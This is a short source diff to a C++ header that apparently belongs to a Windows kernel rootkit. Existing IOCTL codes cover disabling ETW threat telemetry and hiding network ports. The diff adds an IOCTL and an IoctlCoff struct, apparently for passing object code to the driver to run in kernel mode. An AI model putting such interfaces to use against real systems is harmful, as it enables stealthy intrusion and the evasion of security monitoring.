@@ -47,6 +47,8 @@ constexpr unsigned long IOCTL_ENABLE_DISABLE_ETWTI = static_cast<unsigned long>(
 constexpr unsigned long IOCTL_HIDE_UNHIDE_PORT = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81C, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
 constexpr unsigned long IOCTL_CLEAR_HIDDEN_PORTS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81D, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
 constexpr unsigned long IOCTL_LIST_HIDDEN_PORTS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81E, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
+
+constexpr unsigned long IOCTL_EXEC_NOF = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81F, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
 // *******************************************************************************************************
 
 // IOCTL related definitions
@@ -268,4 +270,12 @@ struct IoctlThreadList {
 	ThreadType Type;
 	SIZE_T Count;
 	unsigned long* Threads;
+};
+
+struct IoctlCoff {
+	CHAR EntryName[MAX_PATH_COPY];
+	PVOID Data;
+	SIZE_T DataSize;
+	PVOID Parameter;
+	SIZE_T ParameterSize;
 };
